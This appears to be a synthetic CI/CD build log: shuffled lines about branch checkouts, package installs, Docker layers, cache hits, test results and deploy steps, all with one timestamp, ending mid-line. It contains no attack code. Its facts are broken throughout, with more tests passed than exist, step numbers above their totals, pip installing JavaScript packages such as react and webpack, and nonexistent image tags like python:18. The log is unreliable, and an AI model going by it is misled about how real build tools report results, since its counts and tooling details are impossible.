'bugfix/task-368'\nImage pulled successfully\nConnecting to startup.dev:443...\nUsing Python 3.9\nImage pulled successfully\n[12:19:57] DEBUG: Connection pool: 1 active\nWARNING: express has known vulnerabilities\nCompiling lib/service.java...\nArtifact uploaded: dist.zip (31MB)\nArtifact downloaded: 37MB\nLayer 7/11: ENV command\nBuilding Docker image...\n[12:19:57] INFO: Cache refreshed\nChecking out master branch\nAlready up to date.\n\u2713 lint completed\nEnvironment: development\n  PASS: unit/test_auth_login.spec.js\n[12:19:57] WARN: Deprecated API usage\nLoading...\nnpm install: added 409 packages\nTLS handshake completed\nArtifact downloaded: 35MB\nEnvironment: test\nGET /status - 204 (34ms)\n\u2713 Step 'checkout' succeeded\n[12:19:57] DEBUG: Loading configuration\nVerifying...\nCreating production build...\n  PASS: test_cache_hit (270ms)\n  PASS: test_api_health (433ms)\nArtifact uploaded: build.tar.gz (10MB)\nCache restored successfully (157MB)\nUsing Node.js 20.5.9\n\u2717 build failed with exit code 93\nGET /health - 204 (16ms)\n\u2713 build completed\nHEAD is now at 6903fa8\n\u2713 package completed\n\u2713 All checks passed\nCompiling src/index.js...\nWARNING: jest has known vulnerabilities\nLayer 4/13: RUN command\nyarn add: Done in 30.71s\nMinifying app.js\nCompiling lib/app.ts...\n\u2717 build failed with exit code 1\n[12:19:57] DEBUG: Initializing service\nSwitched to branch 'bugfix/task-270'\nStep 5/25: Running migrations\nStep 14/22: Linting\nArtifact downloaded: 7MB\nException: RuntimeError\nLayer 10/15: ENV command\nWARNING: webpack has known vulnerabilities\nnpm install: added 443 packages\n[12:19:57] INFO: Processing request\nGenerating source maps...\nTests: 86 passed, 117 total\nStep 4/19: Deploying\nSnapshots: 29 passed, 23 total\nNODE_ENV=production\nPulling image: alpine:3.11\nnpm install: resolved 1774 packages\nCompiling utils/utils.go...\nnpm install: resolved 317 packages\nArtifact uploaded: build.tar.gz (31MB)\n[12:19:57] DEBUG: Loading configuration\nArtifact uploaded: dist.zip (36MB)\nOptimizing 56 modules...\nUsing Python 3.9\n\u2717 build failed with exit code 16\n\u2713 Step 'install' succeeded\n[12:19:57] DEBUG: Query executed in 52ms\n\u2713 Task completed in 2665ms\npip: Installing build dependencies...\nTest Suites: 18 passed, 28 total\nCache restored successfully (500MB)\nCache hit for key-4851\nPOST /upload - 202 (139ms)\nTransforming 343 files...\nFAILED: test_user_create\nCache saved successfully\nBuilding Docker image...\nUsing Node.js 15.0.1\nCompiling utils/app.ts...\n[12:19:57] INFO: Cache refreshed\npip install: Successfully installed react-5.4\nUploading artifact 'build' (18 files)\nnpm notice: package.json updated\nnpm install: added 436 packages\nStep 4/21: Testing\n[12:19:57] DEBUG: Connection pool: 17 active\nWARNING: jest has known vulnerabilities\nChecking out main branch\nPlatform: win32-x64\nnpm notice: package.json updated\nOptimizing 28 modules...\nWaiting...\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling express@3.0.0\nLayer 3/8: COPY command\n=== Step type_check completed ===\n=== Step: setup_environment ===\n[12:19:57] WARN: Deprecated API usage\nDone.\n  PASS: unit/test_api_health.spec.js\nSnapshots: 32 passed, 44 total\nyarn add: Done in 24.6s\nInstalling webpack@2.14.6\n[12:19:57] INFO: Processing request\nTLS handshake completed\n\u2713 Task completed in 1156ms\n\u2713 validate completed\nPulling image: python:18\nFAILED: test_user_create\nCreating production build...\nArtifact downloaded: 50MB\nWARNING: express has known vulnerabilities\nCoverage: 73% statements, 82% branches\nFetching submodules...\nCreating production build...\n[12:19:57] INFO: Starting build process\nSnapshots: 16 passed, 9 total\nHEAD is now at 86b14d5\npip: Installing build dependencies...\n[12:19:57] INFO: Processing request\n[12:19:57] INFO: Processing request\nLayer 9/9: RUN command\nSwitched to branch 'hotfix/task-387'\nCreating production build...\nWARNING: webpack has known vulnerabilities\nHEAD is now at f181b22\nTests: 82 passed, 112 total\n[12:19:57] DEBUG: Initializing service\nCreating production build...\nWaiting...\nSuccess!\npip: Downloading react-4.5.tar.gz\nCache restored successfully (483MB)\n  PASS: e2e/test_auth_login.spec.js\n[12:19:57] DEBUG: Loading configuration\nLayer 4/9: ENV command\nAlready up to date.\nUsing Python 3.11\nReady.\nCache restored successfully (303MB)\nTests: 368 passed, 427 total\nWaiting...\nTLS handshake completed\nTests: 105 passed, 441 total\nNODE_ENV=production\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCoverage: 91% statements, 86% branches\nTest Suites: 19 passed, 18 total\nReady.\nCoverage: 95% statements, 79% branches\nNODE_ENV=development\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTest Suites: 9 passed, 10 total\nWaiting...\n[12:19:57] DEBUG: Initializing service\nFinished.\nyarn add: Done in 15.37s\nTransforming 521 files...\nSwitched to branch 'feature/task-618'\nCache hit for key-2534\nCache saved successfully\nTransforming 247 files...\nUsing Node.js 19.13.9\nSnapshots: 41 passed, 39 total\nCache miss for key-1559\nSnapshots: 5 passed, 14 total\n[12:19:57] DEBUG: Query executed in 87ms\n[12:19:57] INFO: Starting build process\nBuilding Docker image...\nBuilding Docker image...\n[12:19:57] WARN: Deprecated API usage\nCompiling src/main.py...\nRan 92 tests in 50s\nArtifact uploaded: dist.zip (56MB)\nCache saved successfully\nStep 9/25: Testing\nMinifying app.js\nException: TypeError\n\u2713 Step 'test' succeeded\n[12:19:57] WARN: Deprecated API usage\nImage pulled successfully\nCompleted.\nPushing to registry...\nVerifying...\npip install: Successfully installed lodash-5.4\nAlready up to date.\nGET /api - 201 (71ms)\nUsing Python 3.11\nVerifying...\nCompiling lib/service.java...\nBuilding Docker image...\n[12:19:57] ERROR: Connection failed\nArtifact downloaded: 24MB\nFetching submodules...\nProcessing...\nConnection established\nInstalling lodash@2.18.10\n[12:19:57] DEBUG: Connection pool: 15 active\nnpm install: resolved 133 packages\nStep 10/21: Deploying\nCache restored successfully (430MB)\n[12:19:57] WARN: Deprecated API usage\nCompleted.\n[12:19:57] INFO: Cache refreshed\n[12:19:57] DEBUG: Initializing service\nBuilding Docker image...\nRan 148 tests in 14s\n[12:19:57] INFO: Processing request\nSuccess!\nTLS handshake completed\nCreating production build...\nInstalling lodash@4.11.0\nTime: 117.66s\n[12:19:57] INFO: Processing request\nPOST /data - 202 (373ms)\n[12:19:57] DEBUG: Loading configuration\n  PASS: integration/test_user_create.spec.js\nInstalling webpack@5.6.8\nTest Suites: 12 passed, 12 total\nTransforming 177 files...\nCache miss for key-5232\npip install: Successfully installed prettier-1.9\n[12:19:57] DEBUG: Initializing service\nCache invalidated: node_modules\nUploading artifact 'dist' (46 files)\nStep 11/25: Installing dependencies\nWARNING: lodash has known vulnerabilities\nStep 20/19: Testing\npip: Installing build dependencies...\nSuccess!\n\u2713 lint completed\npip install: Successfully installed webpack-5.5\nTransforming 747 files...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nReady.\nWARNING: lodash has known vulnerabilities\n[12:19:57] WARN: Deprecated API usage\npip: Collecting eslint\nAlready up to date.\nnpm install: added 333 packages\nTests: 129 passed, 172 total\n\u2717 build failed with exit code 47\nCache restored successfully (27MB)\n[12:19:57] INFO: Starting build process\nHEAD is now at 1a37364\nOptimizing 42 modules...\nInstalling axios@1.19.3\nVerifying...\nCreating production build...\n[12:19:57] DEBUG: Memory usage: 451MB\nNODE_ENV=development\n[12:19:57] DEBUG: Connection pool: 13 active\n\u2713 Task completed in 2211ms\nDone.\nTest Suites: 48 passed, 47 total\nCompiling src/app.ts...\n[12:19:57] INFO: Cache refreshed\nTests: 144 passed, 127 total\nCache restored successfully (319MB)\nLayer 7/14: RUN command\npip install: Successfully installed eslint-3.11\nRan 10 tests in 52s\nStep 10/23: Deploying\nImage pulled successfully\n[12:19:57] DEBUG: Connection pool: 11 active\nStep 19/22: Running migrations\n[12:19:57] DEBUG: Loading configuration\n[12:19:57] INFO: Starting build process\n[12:19:57] INFO: Connecting to database\nChecking out master branch\nBundling main.js\nTests: 491 passed, 178 total\nCache restored successfully (71MB)\nCreating production build...\n[12:19:57] WARN: Deprecated API usage\nProcessing...\nSwitched to branch 'feature/task-715'\nTLS handshake completed\nProcessing...\nCache miss for key-9534\nnpm notice: package.json updated\nCache saved successfully\nArtifact uploaded: dist.zip (19MB)\nPOST /upload - 200 (366ms)\nFinished.\n=== Step setup_environment completed ===\n=== Step: upload_artifacts ===\nCompleted.\nnpm notice: created a lockfile\nLayer 5/9: RUN command\npip: Installing build dependencies...\npip: Downloading express-4.3.tar.gz\nCoverage: 85% statements, 61% branches\n[12:19:57] DEBUG: Connection pool: 10 active\nSuccess!\nBuilding Docker image...\nCache restored successfully (221MB)\nStep 11/21: Building\nArtifact uploaded: dist.zip (8MB)\nInstalling express@3.2.8\nCache saved successfully\nVerifying...\nCompiling lib/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nEnvironment: production\nOptimizing 33 modules...\nOptimizing 31 modules...\n[12:19:57] WARN: Deprecated API usage\nStep 6/23: Building\nyarn add: Done in 14.1s\npip: Collecting lodash\n[12:19:57] DEBUG: Connection pool: 14 active\n\u2713 Task completed in 2537ms\n[12:19:57] INFO: Connecting to database\n  PASS: test_db_connect (170ms)\nCompiling components/utils.go...\n\u2713 Step 'checkout' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 17/16: Deploying\nyarn add: Done in 8.93s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nReady.\nTLS handshake completed\nOK\nConnection established\nVerifying...\n[12:19:57] DEBUG: Initializing service\nInstalling eslint@2.8.6\nArtifact downloaded: 41MB\n\u2713 Step 'test' succeeded\nCreating production build...\nArtifact uploaded: build.tar.gz (48MB)\nPushing to registry...\nSnapshots: 6 passed, 42 total\nReady.\n[12:19:57] WARN: Deprecated API usage\npip: Downloading axios-2.15.tar.gz\nArtifact uploaded: dist.zip (5MB)\nArtifact downloaded: 32MB\n[12:19:57] DEBUG: Initializing service\nGenerating source maps...\nMinifying main.js\nUsing Python 3.11\nCreating production build...\npip install: Successfully installed express-1.0\nNODE_ENV=development\n[12:19:57] INFO: Processing request\nPulling image: alpine:latest\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompleted.\nPlatform: linux-x64\nArtifact uploaded: build.tar.gz (34MB)\nCoverage: 92% statements, 67% branches\nTLS handshake completed\nCompiling src/app.ts...\nTests: 410 passed, 223 total\nCompiling utils/service.java...\nArtifact uploaded: build.tar.gz (11MB)\nReady.\nWaiting...\nStep 3/19: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Collecting jest\nSnapshots: 39 passed, 12 total\nFetching submodules...\nnpm install: added 31 packages\nnpm notice: package.json updated\nTest Suites: 8 passed, 7 total\npip: Installing build dependencies...\n\u2713 build completed\n[12:19:57] INFO: Connecting to database\nCompleted.\npip: Downloading jest-3.17.tar.gz\npip: Downloading lodash-3.5.tar.gz\nWARNING: lodash has known vulnerabilities\n\u2717 build failed with exit code 40\n[12:19:57] DEBUG: Initializing service\n[12:19:57] DEBUG: Query executed in 36ms\n[12:19:57] DEBUG: Initializing service\nLoading...\n[12:19:57] INFO: Cache refreshed\nLoading...\npip install: Successfully installed eslint-1.18\nWARNING: jest has known vulnerabilities\n\u2713 All checks passed\nSwitched to branch 'feature/task-112'\nMinifying main.js\nInstalling jest@3.10.5\nnpm install: resolved 304 packages\n[12:19:57] DEBUG: Connection pool: 16 active\nCache miss for key-7771\n[12:19:57] DEBUG: Memory usage: 657MB\nSwitched to branch 'feature/task-833'\nVerifying...\n  PASS: integration/test_user_create.spec.js\nCompiling components/main.py...\n\u2713 All checks passed\nDone.\nOptimizing 52 modules...\nnpm notice: package.json updated\nUploading artifact 'coverage' (39 files)\nCache miss for key-1912\nStep 9/15: Testing\nHEAD is now at 4893a25\n[12:19:57] DEBUG: Initializing service\nHEAD is now at 951a47d\nCompiling utils/index.js...\nCreating production build...\nFAILED: test_api_health\nStep 1/16: Testing\nUploading artifact 'build' (42 files)\nSuccess!\n[12:19:57] WARN: Deprecated API usage\nCache restored successfully (41MB)\n[12:19:57] DEBUG: Initializing service\nnpm install: added 488 packages\n[12:19:57] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nGET /health - 204 (64ms)\npip: Collecting lodash\nOK\nnpm notice: created a lockfile\nGenerating source maps...\nSuccess!\nPlatform: win32-x64\nTLS handshake completed\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nRan 33 tests in 29s\nStep 3/17: Testing\nAlready up to date.\nTime: 36.765s\nCache invalidated: node_modules\nPlatform: darwin-arm64\nnpm install: added 163 packages\nRan 106 tests in 24s\nCache restored successfully (34MB)\n[12:19:57] DEBUG: Loading configuration\nPlatform: darwin-arm64\nAlready up to date.\nStep 8/15: Linting\nCompiling components/utils.go...\nOK\nArtifact uploaded: build.tar.gz (9MB)\nArtifact uploaded: dist.zip (68MB)\nCache hit for key-3478\nCache invalidated: dependencies\nTLS handshake completed\nCoverage: 92% statements, 88% branches\n[12:19:57] INFO: Starting build process\nFinished.\nTests: 61 passed, 63 total\nImage pulled successfully\nTransforming 523 files...\nCache restored successfully (471MB)\n[12:19:57] WARN: Deprecated API usage\n\u2717 build failed with exit code 20\nUsing Python 3.9\n[12:19:57] DEBUG: Memory usage: 1395MB\nConnection established\nPlatform: linux-x64\nStep 19/16: Running migrations\nCache hit for key-1238\nRan 173 tests in 18s\nCache miss for key-4887\nBuilding Docker image...\nGET /api - 200 (56ms)\nCompleted.\n[12:19:57] INFO: Starting build process\nVerifying...\n[12:19:57] DEBUG: Loading configuration\nUsing Node.js 17.20.10\n[12:19:57] WARN: Deprecated API usage\nMinifying vendor.js\nTransforming 289 files...\n=== Step upload_artifacts completed ===\n=== Step: integration_tests ===\nVerifying...\nUsing Node.js 18.15.8\n\u2713 build completed\n[12:19:57] DEBUG: Query executed in 79ms\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUsing Python 3.9\nCompiling components/index.js...\nHEAD is now at 7706b89\n\u2713 Task completed in 485ms\n[12:19:57] INFO: Request completed\nnpm notice: package.json updated\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling components/index.js...\n[12:19:57] INFO: Processing request\nBundling vendor.js\nWARNING: express has known vulnerabilities\n[12:19:57] WARN: Deprecated API usage\nCompiling lib/handler.rs...\nStep 3/16: Building\nStep 3/25: Building\nImage pulled successfully\nDone.\nArtifact uploaded: dist.zip (85MB)\nCache invalidated: node_modules\nTransforming 846 files...\nArtifact uploaded: dist.zip (45MB)\nGET /status - 204 (6ms)\npip: Collecting express\nCache miss for key-5513\nNODE_ENV=development\nOptimizing 52 modules...\npip: Collecting react\nnpm install: added 281 packages\nStep 3/16: Linting\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nUploading artifact 'coverage' (25 files)\nNODE_ENV=development\nUsing Node.js 20.13.9\nStep 8/16: Building\npip: Collecting react\nStep 15/20: Linting\n\u2713 All checks passed\nSwitched to branch 'feature/task-422'\nArtifact uploaded: dist.zip (51MB)\nOK\nBundling main.css\n\u2713 Task completed in 981ms\npip: Installing build dependencies...\nStep 1/23: Running migrations\nTLS handshake completed\nCompiling components/main.py...\nPulling image: node:3.11\n[12:19:57] DEBUG: Initializing service\nBuilding Docker image...\npip install: Successfully installed react-5.3\nCompiling src/handler.rs...\n\u2713 Task completed in 2050ms\nHEAD is now at 6765ab9\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nyarn add: Done in 12.39s\nConnection established\nFetching submodules...\nPushing to registry...\n[12:19:57] WARN: Deprecated API usage\nReady.\nLoading...\nCache invalidated: dependencies\nPulling image: python:3.11\nArtifact downloaded: 43MB\nNODE_ENV=development\n[12:19:57] INFO: Connecting to database\n[12:19:57] WARN: Deprecated API usage\nImage pulled successfully\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nConnection established\nnpm install: added 36 packages\nDone.\nOptimizing 48 modules...\nVerifying...\n  PASS: unit/test_api_health.spec.js\n[12:19:57] INFO: Processing request\nEnvironment: production\npip: Downloading webpack-2.19.tar.gz\nCompiling src/main.py...\nFAILED: test_db_connect\nCache restored successfully (175MB)\nUploading artifact 'build' (15 files)\nnpm install: added 243 packages\nOptimizing 22 modules...\nCreating production build...\nCache saved successfully\nOK\nStep 17/20: Running migrations\n[12:19:57] DEBUG: Loading configuration\nPushing to registry...\nImage pulled successfully\n[12:19:57] WARN: Deprecated API usage\nPlatform: win32-x64\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUsing Node.js 18.6.7\nCompiling components/service.java...\nImage pulled successfully\npip: Installing build dependencies...\nStep 15/25: Testing\nTLS handshake completed\nnpm notice: created a lockfile\npip install: Successfully installed lodash-4.17\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUploading artifact 'coverage' (15 files)\n\u2713 All checks passed\nTLS handshake completed\nProcessing...\nFetching submodules...\npip: Downloading eslint-5.1.tar.gz\npip install: Successfully installed jest-2.5\n\u2713 Task completed in 1736ms\nCache saved successfully\nAlready up to date.\nTests: 113 passed, 453 total\nImage pulled successfully\nPushing to registry...\n[12:19:57] DEBUG: Initializing service\n  PASS: unit/test_cache_hit.spec.js\nStep 4/22: Building\nOK\nWARNING: prettier has known vulnerabilities\nFinished.\n[12:19:57] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:57] INFO: Starting build process\n  PASS: test_user_create (12ms)\nStep 10/25: Testing\nSnapshots: 19 passed, 43 total\nHEAD is now at a83c502\n  PASS: integration/test_db_connect.spec.js\nCache hit for key-2118\nStep 11/16: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:57] WARN: Deprecated API usage\nCreating production build...\nChecking out master branch\n[12:19:57] DEBUG: Connection pool: 11 active\nStep 16/24: Running migrations\nCache saved successfully\nyarn add: Done in 30.60s\n[12:19:57] DEBUG: Connection pool: 7 active\nCompiling lib/main.py...\nImage pulled successfully\nAlready up to date.\nStep 6/20: Deploying\npip: Downloading webpack-1.8.tar.gz\n[12:19:57] INFO: Connecting to database\nUsing Python 3.12\nLayer 3/15: ENV command\nGET /health - 200 (12ms)\nStep 10/21: Running migrations\nChecking out master branch\npip: Collecting express\nCache hit for key-7456\npip: Installing build dependencies...\nWaiting...\nImage pulled successfully\nTransforming 347 files...\n[12:19:57] INFO: Request completed\n\u2713 Step 'test' succeeded\n\u2713 Task completed in 219ms\nDone.\nRan 19 tests in 60s\n[12:19:57] WARN: Deprecated API usage\n[12:19:57] WARN: Deprecated API usage\nnpm notice: package.json updated\nLoading...\nFetching submodules...\nConnection established\nCache restored successfully (274MB)\nConnecting to test.io:443...\npip install: Successfully installed express-3.13\nnpm notice: created a lockfile\n\u2713 Task completed in 554ms\nCompiling lib/index.js...\nUploading artifact 'coverage' (17 files)\nVerifying...\nCache miss for key-6947\nPushing to registry...\nHEAD is now at e502896\n=== Step integration_tests completed ===\n=== Step: install_dependencies ===\nUploading artifact 'dist' (1 files)\nWARNING: prettier has known vulnerabilities\nBuilding Docker image...\nStep 10/24: Running migrations\nWARNING: express has known vulnerabilities\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompleted.\nPulling image: python:latest\nOptimizing 22 modules...\nException: ValueError\n\u2713 deploy completed\nnpm install: added 137 packages\nLayer 4/13: COPY command\nArtifact uploaded: build.tar.gz (31MB)\n[12:19:57] INFO: Cache refreshed\nCompiling lib/utils.go...\nTLS handshake completed\nArtifact uploaded: build.tar.gz (48MB)\nRan 193 tests in 49s\npip: Collecting react\nTest Suites: 32 passed, 45 total\nRan 59 tests in 51s\nOptimizing 85 modules...\nStep 8/20: Building\nLoading...\nOptimizing 23 modules...\npip: Installing build dependencies...\nTime: 72.38s\nGenerating source maps...\nnpm notice: package.json updated\nReady.\nHEAD is now at 8da9fcf\nCache saved successfully\nArtifact uploaded: dist.zip (73MB)\nyarn add: Done in 18.94s\n[12:19:57] ERROR: Connection failed\nBuilding Docker image...\nnpm install: added 283 packages\nSwitched to branch 'hotfix/task-758'\n\u2713 All checks passed\nSnapshots: 36 passed, 45 total\nStep 3/18: Deploying\nCache saved successfully\n[12:19:57] DEBUG: Query executed in 12ms\nEnvironment: test\nStep 4/21: Installing dependencies\nPlatform: linux-x64\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm notice: package.json updated\n[12:19:57] DEBUG: Query executed in 5ms\nReady.\nAlready up to date.\n\u2713 Task completed in 3875ms\nTests: 88 passed, 179 total\n\u2713 validate completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache miss for key-6862\nImage pulled successfully\nnpm notice: created a lockfile\npip: Downloading eslint-1.13.tar.gz\nOptimizing 38 modules...\nTLS handshake completed\nReady.\nyarn add: Done in 22.13s\nCache miss for key-2834\nStep 16/18: Running migrations\n  PASS: test_api_health (68ms)\nInstalling eslint@3.0.9\nStep 1/17: Testing\nVerifying...\nVerifying...\nVerifying...\nArtifact uploaded: build.tar.gz (3MB)\n[12:19:57] ERROR: Connection failed\npip: Collecting webpack\nVerifying...\n[12:19:57] INFO: Connecting to database\nPlatform: linux-x64\nUsing Node.js 18.14.6\nDone.\nnpm notice: created a lockfile\n[12:19:57] ERROR: Connection failed\nnpm notice: package.json updated\nWaiting...\nCache miss for key-9990\nSnapshots: 28 passed, 47 total\nConnecting to acme.corp:443...\npip install: Successfully installed prettier-1.8\nSwitched to branch 'hotfix/task-809'\nProcessing...\nOptimizing 38 modules...\nStep 2/17: Deploying\n[12:19:57] WARN: Deprecated API usage\nCache invalidated: dependencies\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nVerifying...\n[12:19:57] ERROR: Connection failed\n[12:19:57] ERROR: Connection failed\n[12:19:57] WARN: Deprecated API usage\nCache miss for key-4911\n[12:19:57] DEBUG: Query executed in 51ms\nChecking out master branch\nyarn add: Done in 28.35s\nTime: 76.67s\nyarn add: Done in 19.38s\n\u2713 build completed\nCreating production build...\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache restored successfully (172MB)\nWARNING: express has known vulnerabilities\nStep 5/19: Installing dependencies\nArtifact downloaded: 16MB\nSwitched to branch 'feature/task-448'\nGET /api - 204 (57ms)\nyarn add: Done in 26.27s\n[12:19:57] ERROR: Connection failed\nCache invalidated: node_modules\nCache miss for key-3380\nProcessing...\nVerifying...\nBuilding Docker image...\nSwitched to branch 'feature/task-739'\nCompiling lib/utils.go...\nBuilding Docker image...\n[12:19:57] DEBUG: Memory usage: 1780MB\nCache restored successfully (172MB)\npip install: Successfully installed react-3.2\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm install: added 247 packages\n\u2713 Step 'setup' succeeded\nStep 6/18: Deploying\n\u2717 build failed with exit code 66\nTransforming 106 files...\nCoverage: 77% statements, 69% branches\nAlready up to date.\nTests: 178 passed, 402 total\nVerifying...\nPOST /api - 201 (311ms)\nTest Suites: 23 passed, 41 total\n[12:19:57] WARN: Deprecated API usage\n[12:19:57] DEBUG: Query executed in 96ms\npip: Collecting lodash\nStep 10/15: Testing\nPlatform: linux-x64\nFetching submodules...\nnpm notice: package.json updated\nnpm install: added 297 packages\n[12:19:57] INFO: Starting build process\nImage pulled successfully\nUsing Node.js 19.19.4\nnpm notice: package.json updated\nCache hit for key-6164\n  PASS: test_api_health (56ms)\n[12:19:57] DEBUG: Loading configuration\nBundling main.js\nProcessing...\nOK\nTests: 332 passed, 375 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOK\nStep 7/24: Building\nTest Suites: 32 passed, 40 total\n[12:19:57] INFO: Starting build process\n[12:19:57] WARN: Deprecated API usage\nTests: 158 passed, 185 total\nStep 8/17: Installing dependencies\nLayer 6/15: ENV command\nArtifact uploaded: dist.zip (18MB)\nUsing Python 3.9\nStep 4/18: Deploying\n[12:19:57] WARN: Deprecated API usage\nCache invalidated: node_modules\nBuilding Docker image...\nCompiling utils/handler.rs...\nCompiling lib/app.ts...\nArtifact uploaded: build.tar.gz (34MB)\nyarn add: Done in 12.99s\n[12:19:57] INFO: Cache refreshed\nArtifact downloaded: 41MB\nCache miss for key-1414\npip install: Successfully installed eslint-1.10\nLayer 4/11: ENV command\npip install: Successfully installed express-5.3\n[12:19:57] INFO: Cache refreshed\nTime: 65.461s\n  PASS: test_cache_hit (259ms)\nCompleted.\n=== Step install_dependencies completed ===\n=== Step: setup_node ===\n[12:19:57] DEBUG: Connection pool: 4 active\n[12:19:57] INFO: Starting build process\npip: Downloading express-1.12.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-6273\nWARNING: eslint has known vulnerabilities\nWaiting...\nCache saved successfully\nException: NullPointerException\nnpm notice: created a lockfile\nHEAD is now at 0b5e8cd\n[12:19:57] INFO: Processing request\nWARNING: lodash has known vulnerabilities\nLayer 4/11: COPY command\nGET /health - 200 (2ms)\nUsing Python 3.9\nUploading artifact 'coverage' (20 files)\nCreating production build...\nStep 13/21: Linting\nStep 6/21: Linting\nNODE_ENV=development\nGenerating source maps...\nPOST /upload - 201 (12ms)\nNODE_ENV=test\nnpm notice: package.json updated\nSwitched to branch 'bugfix/task-253'\n[12:19:57] DEBUG: Memory usage: 902MB\nStep 19/20: Installing dependencies\nCompiling lib/app.ts...\nFAILED: test_cache_hit\n\u2717 build failed with exit code 127\nnpm notice: package.json updated\nCompiling utils/main.py...\n[12:19:57] INFO: Request completed\nFetching submodules...\nCache invalidated: dependencies\nProcessing...\nBundling vendor.js\n[12:19:57] DEBUG: Query executed in 29ms\nnpm install: resolved 1614 packages\n[12:19:57] DEBUG: Memory usage: 1099MB\nException: TypeError\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUsing Node.js 20.19.3\nnpm notice: created a lockfile\n  PASS: test_user_create (86ms)\n\u2713 Task completed in 2769ms\nException: NullPointerException\n[12:19:57] DEBUG: Loading configuration\nTest Suites: 18 passed, 36 total\n[12:19:57] DEBUG: Connection pool: 12 active\nArtifact uploaded: dist.zip (59MB)\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 All checks passed\nStep 20/15: Installing dependencies\nUsing Node.js 20.9.8\nBundling runtime.js\n[12:19:57] DEBUG: Initializing service\nTransforming 248 files...\nStep 19/15: Deploying\n[12:19:57] INFO: Processing request\nPushing to registry...\n[12:19:57] INFO: Starting build process\nTLS handshake completed\nnpm install: resolved 591 packages\nMinifying main.js\nStep 4/25: Linting\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2717 build failed with exit code 12\nDone.\n\u2713 Step 'checkout' succeeded\n[12:19:57] DEBUG: Query executed in 10ms\nCoverage: 83% statements, 68% branches\nPOST /data - 200 (18ms)\n[12:19:57] DEBUG: Loading configuration\nBuilding Docker image...\nWARNING: prettier has known vulnerabilities\nnpm notice: created a lockfile\nUsing Python 3.9\npip: Downloading jest-1.12.tar.gz\nArtifact uploaded: build.tar.gz (21MB)\nPlatform: win32-x64\n  PASS: integration/test_user_create.spec.js\npip: Downloading webpack-2.1.tar.gz\nNODE_ENV=test\nFetching submodules...\nCache restored successfully (392MB)\nStep 19/17: Deploying\nConnection established\nUsing Python 3.9\nBundling styles.js\nCache invalidated: node_modules\nFetching submodules...\n[12:19:57] DEBUG: Initializing service\nStep 16/24: Building\nDone.\nUsing Python 3.10\nPOST /data - 200 (229ms)\n\u2713 All checks passed\nTests: 62 passed, 130 total\npip: Downloading react-5.8.tar.gz\nCompiling utils/utils.go...\nStep 17/23: Building\nFinished.\nFinished.\nStep 17/25: Deploying\n[12:19:57] INFO: Cache refreshed\n[12:19:57] DEBUG: Connection pool: 9 active\nFetching submodules...\nCache saved successfully\nHEAD is now at d481277\nTLS handshake completed\n[12:19:57] WARN: Deprecated API usage\nCache restored successfully (130MB)\nTransforming 145 files...\nAlready up to date.\nImage pulled successfully\nSuccess!\n[12:19:57] DEBUG: Memory usage: 323MB\nHEAD is now at a7ac7ec\nArtifact uploaded: build.tar.gz (19MB)\nUploading artifact 'build' (40 files)\n  PASS: test_auth_login (30ms)\nLayer 7/15: RUN command\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling express@3.6.9\nInstalling lodash@4.1.6\nVerifying...\nnpm install: added 385 packages\n[12:19:57] DEBUG: Loading configuration\n[12:19:57] DEBUG: Loading configuration\nArtifact downloaded: 13MB\nTime: 90.497s\nBuilding Docker image...\n\u2717 build failed with exit code 72\nSuccess!\nStep 19/16: Installing dependencies\nnpm notice: created a lockfile\nPulling image: node:18\nStep 11/17: Installing dependencies\nStep 20/23: Building\n[12:19:57] DEBUG: Initializing service\n\u2717 build failed with exit code 33\nDone.\nSnapshots: 50 passed, 37 total\nFetching submodules...\nFetching submodules...\n\u2713 Step 'install' succeeded\nEnvironment: test\nTransforming 756 files...\nImage pulled successfully\n[12:19:57] INFO: Starting build process\nUsing Node.js 17.17.3\nGET /api - 204 (81ms)\npip install: Successfully installed webpack-5.7\nWaiting...\nCache restored successfully (201MB)\nStep 14/24: Linting\nFinished.\npip: Collecting express\nNODE_ENV=production\nException: NullPointerException\nInstalling axios@1.1.3\nCreating production build...\n\u2713 Task completed in 506ms\n[12:19:57] INFO: Processing request\npip: Downloading webpack-1.2.tar.gz\nHEAD is now at c7aea63\n\u2713 Step 'checkout' succeeded\nWARNING: prettier has known vulnerabilities\n[12:19:57] DEBUG: Connection pool: 10 active\nCache hit for key-2484\n[12:19:57] INFO: Connecting to database\nTests: 59 passed, 79 total\n[12:19:57] INFO: Connecting to database\npip: Collecting react\n[12:19:57] INFO: Cache refreshed\nFetching submodules...\nStep 10/20: Building\nVerifying...\nDone.\nInstalling 